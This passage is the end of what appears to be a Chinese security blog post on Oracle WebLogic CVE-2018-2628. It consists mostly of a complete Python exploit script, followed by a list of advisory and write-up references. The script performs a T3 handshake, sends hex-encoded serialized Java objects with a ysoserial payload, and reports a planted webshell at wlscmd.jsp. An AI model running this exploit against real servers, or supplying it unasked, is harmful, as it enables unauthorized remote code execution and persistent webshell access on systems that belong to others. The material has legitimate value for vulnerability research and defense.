    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">))</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'handshake successful'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">build_t3_request_object</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">data1</span> <span class="o">=</span> <span class="s1">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span>
    <span class="n">data2</span> <span class="o">=</span> <span class="s1">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">'{:04x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">dport</span><span class="p">))</span>
    <span class="n">data3</span> <span class="o">=</span> <span class="s1">'1a7727000d3234322e323134'</span>
    <span class="n">data4</span> <span class="o">=</span> <span class="s1">'2e312e32353461863d1d0000000078'</span>
    <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="p">[</span><span class="n">data1</span><span class="p">,</span><span class="n">data2</span><span class="p">,</span><span class="n">data3</span><span class="p">,</span><span class="n">data4</span><span class="p">]:</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">d</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">))</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'send request payload successful,recv length:</span><span class="si">%d</span><span class="s1">'</span><span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">))))</span>


<span class="k">def</span> <span class="nf">send_payload_objdata</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">payload</span><span class="o">=</span><span class="s1">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">data</span>
    <span class="n">payload</span><span class="o">+=</span><span class="s1">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'</span><span class="si">%s%s</span><span class="s1">'</span><span class="o">%</span><span class="p">(</span><span class="s1">'{:08x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">))</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">))</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">res</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">return</span> <span class="n">res</span>


<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">dip</span><span class="p">,</span> <span class="n">dport</span><span class="p">,</span> <span class="n">path_ysoserial</span><span class="p">,</span> <span class="n">jrmp_listener_ip</span><span class="p">,</span> <span class="n">jrmp_listener_port</span><span class="p">,</span> <span class="n">jrmp_client</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'--------------------------------------------'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'Weblogic GetShell Exploit for CVE-2018-2628'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'by k8gege build 20180426'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'--------------------------------------------'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"sending payload"</span><span class="p">);</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">server_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">dip</span><span class="p">,</span> <span class="n">dport</span><span class="p">)</span>
    <span class="n">t3_handshake</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_addr</span><span class="p">)</span>
    <span class="n">build_t3_request_object</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">dport</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">generate_payload</span><span class="p">(</span><span class="n">path_ysoserial</span><span class="p">,</span> <span class="n">jrmp_listener_ip</span><span class="p">,</span> <span class="n">jrmp_listener_port</span><span class="p">,</span> <span class="n">jrmp_client</span><span class="p">)</span>

    <span class="n">rs</span><span class="o">=</span><span class="n">send_payload_objdata</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="c1">#print('response: ' + rs)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'exploit completed!'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'shell: http://'</span><span class="o">+</span><span class="n">dip</span><span class="o">+</span><span class="s1">':'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">dport</span><span class="p">)</span><span class="o">+</span><span class="s2">"/bea_wls_internal/wlscmd.jsp"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'Please use the k8fly connection shell'</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'--------------------------------------------'</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'Weblogic GetShell Exploit for CVE-2018-2628'</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'by k8gege build 20180426'</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'Usage: exploit [weblogic ip] [weblogic port]'</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'--------------------------------------------'</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>

    <span class="n">dip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">dport</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">exploit</span><span class="p">(</span><span class="n">dip</span><span class="p">,</span> <span class="n">dport</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span>
</pre></div>
<h1 data-content="1" id="c4226e12d1d20c7dfba1923d3b32e64d">参考</h1>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-2628" target="_blank">https://nvd.nist.gov/vuln/detail/CVE-2018-2628</a></p>
<p><a href="http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html" target="_blank">http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html</a></p>
<p><a href="http://xxlegend.com/2018/04/18/CVE-2018-2628 简单复现和分析/" target="_blank">http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
<p><a href="https://paper.seebug.org/731/" target="_blank">https://paper.seebug.org/731/</a></p>
<p><a href="https://www.cnblogs.com/k8gege/p/9501674.html" target="_blank">https://www.cnblogs.com/k8gege/p/9501674.html</a></p>
<p><a href="https://docs.oracle.com/cd/E13222_01/wls/docs100/perform/WLSTuning.html#wp1152246" target="_blank">https://docs.oracle.com/cd/E13222_01/wls/docs100/perform/WLSTuning.html#wp1152246</a></p>
<p><a href="https://www.securityfocus.com/bid/93604" target="_blank">https://www.securityfocus.com/bid/93604</a></p>
<p><a href="https://blog.csdn.net/raintungli/article/details/56008382?spm=a2c6h.12873639.0.0.1e3e1d42RDduAR" target="_blank">https://blog.csdn.net/raintungli/article/details/56008382?spm=a2c6h.12873639.0.0.1e3e1d42RDduAR</a></p>
<p><a href="https://www.cnblogs.com/afanti/p/10526159.html" target="_blank">https://www.cnblogs.com/afanti/p/10526159.html</a></p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2628" target="_blank">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2628</a></p>
<p><a href="https://www.exploit-db.com/exploits/44553" target="_blank">https://www.exploit-db.com/exploits/44553</a></p>
</div>
</div>